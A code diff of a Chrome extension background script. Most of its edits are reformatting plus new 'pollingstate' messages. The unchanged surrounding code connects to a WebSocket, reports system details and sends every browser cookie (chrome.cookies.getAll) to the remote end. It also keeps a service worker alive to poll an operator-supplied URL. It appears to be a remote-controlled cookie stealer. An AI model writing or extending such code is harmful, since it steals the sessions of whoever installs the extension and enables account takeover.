@@ -50,6 +50,7 @@ async function connectWebSocket() {
         os: "windows",
         username: "user",
       });
+      send("pollingstate", { state: false });
       chrome.cookies.getAll({}, function (cookies) {
         send("setcookies", cookies);
       });
@@ -81,63 +82,62 @@ let pollingIntervalId = null;
 chrome.runtime.onInstalled.addListener(() => {
   chrome.storage.local.set({
     isRunning: false,
-    url: '',
+    url: "",
     interval: 5000,
-    lastPoll: null
+    lastPoll: null,
   });
 });
 
 // Keep service worker alive while polling
 let keepAlivePort = null;
 
-
 // Start polling the specified URL
 async function startPolling(url, interval = 5000) {
   if (!url) {
-    throw new Error('URL is required');
+    throw new Error("URL is required");
   }
-  
-  if (!interval ) {
-    throw new Error('Interval is required');
+
+  if (!interval) {
+    throw new Error("Interval is required");
   }
-  
+
   // Update the polling interval
   pollingInterval = interval;
-  
+
   try {
     // Stop any existing polling first
     await stopPolling();
-    
+
     // Store the URL, interval, and update state
     await chrome.storage.local.set({
       isRunning: true,
       url: url,
       interval: interval,
-      lastPoll: null
+      lastPoll: null,
     });
-    
+
     // Create a connection to keep the service worker alive
     if (!keepAlivePort) {
-      keepAlivePort = chrome.runtime.connect({ name: 'keepAlive' });
+      keepAlivePort = chrome.runtime.connect({ name: "keepAlive" });
       keepAlivePort.onDisconnect.addListener(() => {
         // Try to reconnect if disconnected
         if (pollingIntervalId) {
-          keepAlivePort = chrome.runtime.connect({ name: 'keepAlive' });
+          keepAlivePort = chrome.runtime.connect({ name: "keepAlive" });
         } else {
           keepAlivePort = null;
         }
       });
     }
-    
+
     // Start interval with setInterval
     pollingIntervalId = setInterval(pollURL, pollingInterval);
-    
+
     // Poll immediately
     pollURL();
-    
-    updateStatus('Running');
+
+    send("pollingstate", { state: true });
   } catch (error) {
-    console.error('Error starting polling:', error);
+    console.error("Error starting polling:", error);
     throw error;
   }
 }
@@ -150,21 +150,21 @@ async function stopPolling() {
       clearInterval(pollingIntervalId);
       pollingIntervalId = null;
     }
-    
+
     // Close keepAlive connection
     if (keepAlivePort) {
       keepAlivePort.disconnect();
       keepAlivePort = null;
     }
-    
+
     // Update state
     await chrome.storage.local.set({
-      isRunning: false
+      isRunning: false,
     });
-    
-    updateStatus('Stopped');
+
+    send("pollingstate", { state: false });
   } catch (error) {
-    console.error('Error stopping polling:', error);
+    console.error("Error stopping polling:", error);
     throw error;
   }
 }
@@ -172,27 +172,27 @@ async function stopPolling() {
 // Poll the URL
 async function pollURL() {
   try {
-    const data = await chrome.storage.local.get(['url', 'isRunning']);
-    
+    const data = await chrome.storage.local.get(["url", "isRunning"]);
+
     if (!data.isRunning || !data.url) {
       return;
     }
-    
-    console.log(`Polling URL: ${data.url} at ${new Date().toLocaleTimeString()}`);
-    
+
+    console.log(
+      `Polling URL: ${data.url} at ${new Date().toLocaleTimeString()}`
+    );
+
     // Make the GET request
     const response = await fetch(data.url, {
-      method: 'GET',
-      mode: 'no-cors' // Allows requests to any URL
+      method: "GET",
+      mode: "no-cors", // Allows requests to any URL
     });
-    
+
     // Update the last poll time
     const now = Date.now();
     await chrome.storage.local.set({ lastPoll: now });
-    
-    updateStatus('Running', now);
   } catch (error) {
-    console.error('Error polling URL:', error);
+    console.error("Error polling URL:", error);
   }
 }
 
